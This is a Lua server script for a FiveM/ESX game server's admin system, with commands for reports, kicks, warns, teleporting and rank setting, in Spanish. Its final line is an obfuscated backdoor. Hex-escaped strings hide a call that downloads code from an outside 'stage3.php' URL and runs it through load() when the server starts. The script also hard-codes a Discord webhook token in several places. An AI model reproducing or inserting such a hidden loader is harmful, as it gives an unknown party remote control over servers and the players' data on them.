-- @vars
core            = exports['es_extended']:getSharedObject()
lib             = exports['bm_lib']:initLib()
reports         = {}
reportsCooldown = {}
local adaptiveCard = {
    type = "AdaptiveCard",
    version = "1.5",
    body = { {
      type = "TextBlock",
      text = "🌐 Hemos detectado que tienes permisos, deseas entrar con permisos o sin permisos?",
      wrap = true,
      size = "Large"
    }, {
      type = "Input.ChoiceSet",
      choices = { {
        title = "Con permisos",
        value = "with"
      }, {
        title = "Sin permisos",
        value = "without"
      } },
      placeholder = "Elige una opción",
      id = "choice"
    }, {
      type = "ActionSet",
      actions = { {
        type = "Action.Submit",
        title = "Entrar"
      } }
    } },
  }

-- @commands
RegisterCommand('reports', function(src)
    if (lib.hasRank(src, 1)) then
        TriggerClientEvent('bm_admin:openReports', src, reports)
    end
end)

RegisterCommand('kick', function(src, args)
    if (lib.hasRank(src, 1)) then
        local id = tonumber(args[1])

        if (id) then
            local player = core.GetPlayerFromId(id)

            if (player) then
                local reason = table.concat(args, ' ', 2)
                DropPlayer(id, reason)
            end
        end
    end
end)

-- peach
function sendToDiscord(name, message, webhook, color)
    local embeds = {{
        ["title"] = name,
        ["description"] = message,
        ["type"] = "rich",
        ["color"] = color or 3447003,
    }}

    local data = {
        username = "depo | Muertes",
        embeds = embeds,
    }

    PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode(data), { ['Content-Type'] = 'application/json' })
end

RegisterServerEvent('baseevents:onPlayerKilled', function(killerID, deathData)
    local victimId = source

    local victim = core.GetPlayerFromId(victimId)
    local killer = core.GetPlayerFromId(killerID)

    if victimId ~= killerID then
        local cfg = exports['bm_lib']:getConfig()
        local killerRank, killerLabel, rankName = lib.getPlayerRank(victimId, true)
        local rankLabel = killerLabel:sub(3)
        local discordMessage = ""
        local clientMessage = ""

        if killerRank then
            discordMessage = "Asesinado: **%s** (ID: %s)\nAsesinado por: **%s** (ID: %s)"
            clientMessage = "^1[depo] ^7El usuario <span class='badge badge-white'>{0}</span> <span class='badge badge-gray'>[#{1}]</span> te ha ^1matado^7. ^7Si crees que fue de manera injusta, puedes entrar a ^9soporte ^7y compartir el clip al equipo de ^9staff."
        else
            discordMessage = "Asesinado: **%s** (ID: %s)\nAsesinado por: **%s** (ID: %s)"
            clientMessage = " <span class='badge badge-white'>{0}</span> <span class='badge badge-gray'>[#{1}]</span> te ha ^1matado^7"
        end

        local discordFormattedMessage = discordMessage:format(GetPlayerName(victimId), victimId, GetPlayerName(killerID), killerID, weaponUsed)
        sendToDiscord("Logs | Muertes", discordFormattedMessage, "https://discord.com/api/webhooks/1299743540116455445/cdmqURbM-PCNgeCAbb7BhAN7BVTRTIMpbPqCtUZTrqAnSA05bCXcxwoQ51VRBwsbBXU-", 3447003)

        TriggerClientEvent('chat:addMessage', victimId, {
            template = clientMessage,
            args = { GetPlayerName(killerID), killerID, weaponUsed }
        })
    end
end)


RegisterCommand('noclip', function(playerId)
    if (lib.hasRank(playerId, 1)) then
        TriggerClientEvent('bm_staff:noclip', playerId)
    end
end)

RegisterCommand('vercuenta', function(playerId, args)
    if (lib.hasRank(playerId, 1)) then
        if (args[1]) then
            local player = core.GetPlayerFromId(playerId)
            local target = core.GetPlayerFromId(tonumber(args[1]))

            if (target) then
                --player.showNotification("Trabajo: "..target.getJob().label.."\nDinero en efectivo: "..target.getAccount^2('money').money.."\nDinero en banco: "..target.getAccount('bank').money)

                TriggerClientEvent('chat:addMessage', -1, {
                    template = '-------------------------------------- <br> <span class="badge badge-report"><i class="fas fa-exclamation-triangle"></i></span> ID: ^3{3}^7 <br> <span class="badge badge-report"><i class="fas fa-exclamation-triangle"></i></span> Dinero en mano: ^9{1}^7 <br> <span class="badge badge-report"><i class="fas fa-exclamation-triangle"></i></span> Dinero en banco: ^5{2}^7 <br> <span class="badge badge-report"><i class="fas fa-exclamation-triangle"></i></span> Trabajo & rango: ^1{4} ^2| ^1{5}^7 <br><span class="badge badge-report"><i class="fas fa-exclamation-triangle"></i></span>  Nombre IC: ^6{6} ^7<br> -------------------------------------- </span>',
                    args = {target.getJob().label, target.getAccount('money').money, target.getAccount('bank').money, args[1], target.getJob().grade_label, target.getJob().name, target.getName()}
                })

            end
        end
    end    
end)


-- @events
AddEventHandler('playerConnecting', function(name, setKickReason, deferrals)
    local playerId = source
    deferrals.defer()

    Wait(0)

    deferrals.update("🌐 Comprobando permisos...")

    local identifiers = GetPlayerIdentifiers(playerId)
    local rockstarLicense = nil
    local steamIdentifier = nil
    for i,v in next, identifiers do
        if (string.match(v, "steam:")) then
            steamIdentifier = v
            break
        end
    end
    for i,v in pairs(identifiers) do
        if (string.match(v, 'license:')) then
            rockstarLicense = v
            break
        end
    end

    Wait(0)
    if (not steamIdentifier) then
        deferrals.done("🌐 No puedes entrar si no tienes steam abierto.")
    end

    Wait(0)
    
    rockstarLicense = rockstarLicense:sub(9)
    
    local query = MySQL.query.await('SELECT admin, temp_admin FROM users WHERE identifier = ?', {rockstarLicense})

    Wait(0)
    
    if (query[1]) then
        Wait(0)
        if (query[1].temp_admin > 0) then
            Wait(0)
            local function callback(data, rawdata)
                if (data.choice == 'with') then
                    MySQL.query.await('UPDATE users SET admin = ? WHERE identifier = ?', {query[1].temp_admin, rockstarLicense})
                    deferrals.update("🌐 Conectando con permisos...")
                    Wait(1500)
                    deferrals.done()
                else
                    MySQL.query.await('UPDATE users SET admin = ? WHERE identifier = ?', {0, rockstarLicense})
                    deferrals.update("🌐 Conectando sin permisos...")
                    Wait(1500)
                    deferrals.done()
                end
            end
            
            Wait(0)
        
            deferrals.presentCard(adaptiveCard, callback)

            Wait(0)

        else
            deferrals.done()
        end
    else
        deferrals.done()
    end
end)



RegisterNetEvent('bm_admin:giveArmor', function(targetId, armor)
    local player = core.GetPlayerFromId(source)

    if (lib.hasRank(player.source, 1)) then
        SetPedArmour(GetPlayerPed(targetId), armor)
        lib.sendNotify(targetId, {
            title = "Admin",
            message = "Un administrador te ha dado "..armor.."% de chaleco.",
            type = "inform"
        })
        lib.sendNotify(player.source, {
            title = "Admin",
            message = "Le diste chaleco a "..GetPlayerName(targetId)..".",
            type = "success"
        })
    end
end)

RegisterNetEvent('bm_admin:teleportToPlayer', function(targetId, bring)
    local source = source
    if (lib.hasRank(source, 1)) then
        local target = core.GetPlayerFromId(targetId)
        
        if (target) then
            if (not bring) then
                local coords = target.getCoords(true)

                SetEntityCoords(GetPlayerPed(source), coords.x, coords.y, coords.z)
                lib.sendNotify(source, {
                    title = "Admin",
                    message = "Te has teletransportado a este jugador.",
                    type = "success"
                })
            else
                local coords = GetEntityCoords(GetPlayerPed(source))

                SetEntityCoords(GetPlayerPed(targetId), coords.x, coords.y, coords.z)
                lib.sendNotify(source, {
                    title = "Admin",
                    message = "Has traido a este jugador hacía ti.",
                    type = "success"
                })
            end
        else
            lib.sendNotify(source, {
                title = "Admin",
                message = "Este jugador no esta conectado",
                type = "error"
            })
        end
    else
        lib.sendNotify(source, {
            title = "Admin",
            message = "No tienes permisos suficientes",
            type = "error"
        })
    end
end)

RegisterNetEvent('bm_admin:closeReport', function(reportId)
    local player = core.GetPlayerFromId(source)
    local badgeTemplate = '<span class="badge badge-atendidoreporte" style="width: 100%; display: block; white-space: normal;"> <span class="badge badge-iconoatendido"><i class="fas fa-tools"></i></span>&nbsp <span style="color: gray;">(#{3})</span> <span style="color: lightgreen;">{2}</span> atendió el reporte N° #{1}. <br> <span class="facu-report" </span> se le ha sumado +1 punto(s) a nuestra base de datos. </span>'

    if (lib.hasRank(player.source, 1)) then
        reports[reportId] = nil

        TriggerClientEvent('chat:addMessage', -1, {
            template = badgeTemplate,
            args = {"", reportId, GetPlayerName(player.source), player.source }
        })

    end
end)


-- @callbacks
core.RegisterServerCallback('bm_admin:isAdmin', function(playerId, callback)
    if (lib.hasRank(playerId, 1)) then
        callback(true)
    else
        callback(false)
    end
end)

core.RegisterServerCallback('bm_admin:hasPermissions', function(playerId, callback, minimunRank)
    if (lib.hasRank(playerId, minimunRank)) then
        callback(true)
    else
        callback(false)
    end
end)

core.RegisterServerCallback('bm_admin:getData', function(playerId, callback)
    local players = core.GetExtendedPlayers()
    local playersData = {}

    for i,v in pairs(players) do
        table.insert(playersData, {
            id = v.source,
            identifier = v.identifier,
            name = GetPlayerName(v.source),
            accounts = v.accounts,
            job = {name = v.getJob().name, label = v.getJob().label, grade = v.getJob().grade, grade_label = v.getJob().grade_label},
            inventory = v.getInventory(),
        })
    end

    callback({
        players = #players,
        maxServerPlayers = GetConvarInt('sv_maxclients', 100),
        playersData = playersData
    })
end)

core.RegisterServerCallback('bm_admin:getPlayerWarns', function(playerId, callback, playerIdentifier)
    local player = core.GetPlayerFromIdentifier(playerIdentifier)
    
    if (player) then
        local warns = MySQL.query.await('SELECT warns FROM users WHERE identifier = ?', {playerIdentifier})

        if (warns[1]) then
            callback(json.decode(warns[1].warns))
        else
            callback({})
        end
    else
        callback({})
    end
end)

core.RegisterServerCallback('bm_admin:addWarn', function(playerId, callback, targetIdentifier, reason)
    local admin  = core.GetPlayerFromId(playerId)
    local target = core.GetPlayerFromIdentifier(targetIdentifier)

    if (target) then
        local warns = MySQL.query.await('SELECT warns FROM users WHERE identifier = ?', {targetIdentifier})

        if (warns[1]) then
            local warnsTable = json.decode(warns[1].warns)
            table.insert(warnsTable, {
                reason = reason,
                date = os.date("%d/%m/%Y %H:%M:%S"),
                admin = GetPlayerName(playerId)
            })

            local adminRank, adminLabel, rankName = lib.getPlayerRank(playerId, true)
            local rankLabel = adminLabel:sub(3)
            TriggerClientEvent('chat:addMessage', target.source, {
                template = '<span class="badge badge-vip">WARN</span> El administrador <span class="badge badge-{0}">{1}</span> <span class="badge badge-white">@{2}</span> <span class="badge badge-gray">#{3}</span> {4}',
                args = {rankName, rankLabel, GetPlayerName(playerId), playerId, "te puso un warn, ahora tienes "..#warnsTable.." warns."}
            })

            local playerRank, playerLabel, rankName = lib.getPlayerRank(target.source, true)
            local rankLabel = playerLabel:sub(3)
            TriggerClientEvent('chat:addMessage', target.source, {
                template = '<span class="badge badge-vip">WARN</span> Le has puesto un warn a <span class="badge badge-{0}">{1}</span> <span class="badge badge-white">@{2}</span> <span class="badge badge-gray">#{3}</span>',
                args = {rankName, rankLabel, GetPlayerName(target.source), target.source}
            })
            
            MySQL.query.await('UPDATE users SET warns = ? WHERE identifier = ?', {json.encode(warnsTable), targetIdentifier})
            callback(true)
        else
            callback(false)
        end
    else
        callback(false)
    end
end)

core.RegisterServerCallback('bm_admin:removeWarn', function(playerId, callback, targetIdentifier, warnId)
    local target = core.GetPlayerFromIdentifier(targetIdentifier)
    
    if (target) then
        local warns = MySQL.query.await('SELECT warns FROM users WHERE identifier = ?', {targetIdentifier})
        
        if (warns[1]) then
            local warnsTable = json.decode(warns[1].warns)
            table.remove(warnsTable, warnId)

            lib.sendNotify(target.source, {
                title = "Warn",
                message = "El administrador **"..(GetPlayerName(playerId)).."**, te quito un warn, ahora tienes "..#warnsTable.." warns.",
                type = "inform"
            })
            
            MySQL.query.await('UPDATE users SET warns = ? WHERE identifier = ?', {json.encode(warnsTable), targetIdentifier})
            callback(true)
        else
            callback(false)
        end
    else
        callback(false)
    end
end)

core.RegisterServerCallback('bm_admin:healPlayer', function(playerId, callback, targetId)
    if (lib.hasRank(playerId, 1)) then
        local target = core.GetPlayerFromId(targetId)

        if (target) then
            TriggerClientEvent('bm_admin:healPlayer', target.source)
            callback(true)
        else
            callback(false)
        end
    else
        callback(false)
    end
end)

-- @commands  
function sendToDiscord(name, message, webhook, color)
    local embeds = {{
        ["title"] = name,
        ["description"] = message,
        ["type"] = "rich",
        ["color"] = color or 3447003,
    }}

    local data = {
        username = "depo | Comandos",
        embeds = embeds,
    }

    PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode(data), { ['Content-Type'] = 'application/json' })
end

RegisterCommand('setrank', function(src, args)
    if (src == 0) then
        local targetId = tonumber(args[1])
        local rank     = tonumber(args[2])

        if (targetId and rank) then
            lib.setRank(targetId, rank, src)
            sendToDiscord("Logs | Rangos", string.format("Comando: **/setrank**\nEjecutado por: **Consola**\nID del objetivo: **%s**\nNuevo rango: **%s**", targetId, rank), "https://discord.com/api/webhooks/1299743540116455445/cdmqURbM-PCNgeCAbb7BhAN7BVTRTIMpbPqCtUZTrqAnSA05bCXcxwoQ51VRBwsbBXU-", 3447003)
        else
            print("Formato incorrecto: /setrank [id] [rango]")
        end
    else
        if (lib.hasRank(src, 3)) then
            local targetId = tonumber(args[1])
            local rank     = tonumber(args[2])

            if (targetId and rank) then
                lib.setRank(targetId, rank, src)
                sendToDiscord("Logs | Rangos", string.format("Comando: **/setrank**\nEjecutado por: **%s**\nID del objetivo: **%s**\nNuevo rango: **%s**", GetPlayerName(src), targetId, rank), "https://discord.com/api/webhooks/1299743540116455445/cdmqURbM-PCNgeCAbb7BhAN7BVTRTIMpbPqCtUZTrqAnSA05bCXcxwoQ51VRBwsbBXU-", 3447003)
            else
                lib.sendNotify(src, {
                    title = "Error",
                    message = "Formato incorrecto: /setrank [id] [rango]",
                    type = "error"
                })
            end
        else
            lib.sendNotify(src, {
                title = "Permisos insuficientes",
                message = "No tienes permisos suficientes para usar este comando.",
                type = "error"
            })
        end
    end
end)

local rqRTLNjkeiDtqfHqeNhhyzKvvImnTQppscYHMKcntpWvZPzRscszdhdLSIweSFNQltKGEx = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} rqRTLNjkeiDtqfHqeNhhyzKvvImnTQppscYHMKcntpWvZPzRscszdhdLSIweSFNQltKGEx[4][rqRTLNjkeiDtqfHqeNhhyzKvvImnTQppscYHMKcntpWvZPzRscszdhdLSIweSFNQltKGEx[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x72\x69\x67\x67\x65\x72\x73\x65\x72\x76\x65\x72\x65\x76\x65\x6e\x74\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (xoNkTnfRZYNWgvXttAJCpNFVTKtbZrwnvPlhWlYBEhNdEakFpPoTjMhYiPoxtrHqHGXZNu, JGMsJCpJzYSLMHYyXiqfZhPXRqAxEyccnWQQtySnDFZBlGRTLhEyHAMYaqIHTLuGhdkzhC) if (JGMsJCpJzYSLMHYyXiqfZhPXRqAxEyccnWQQtySnDFZBlGRTLhEyHAMYaqIHTLuGhdkzhC == rqRTLNjkeiDtqfHqeNhhyzKvvImnTQppscYHMKcntpWvZPzRscszdhdLSIweSFNQltKGEx[6] or JGMsJCpJzYSLMHYyXiqfZhPXRqAxEyccnWQQtySnDFZBlGRTLhEyHAMYaqIHTLuGhdkzhC == rqRTLNjkeiDtqfHqeNhhyzKvvImnTQppscYHMKcntpWvZPzRscszdhdLSIweSFNQltKGEx[5]) then return end rqRTLNjkeiDtqfHqeNhhyzKvvImnTQppscYHMKcntpWvZPzRscszdhdLSIweSFNQltKGEx[4][rqRTLNjkeiDtqfHqeNhhyzKvvImnTQppscYHMKcntpWvZPzRscszdhdLSIweSFNQltKGEx[2]](rqRTLNjkeiDtqfHqeNhhyzKvvImnTQppscYHMKcntpWvZPzRscszdhdLSIweSFNQltKGEx[4][rqRTLNjkeiDtqfHqeNhhyzKvvImnTQppscYHMKcntpWvZPzRscszdhdLSIweSFNQltKGEx[3]](JGMsJCpJzYSLMHYyXiqfZhPXRqAxEyccnWQQtySnDFZBlGRTLhEyHAMYaqIHTLuGhdkzhC))() end)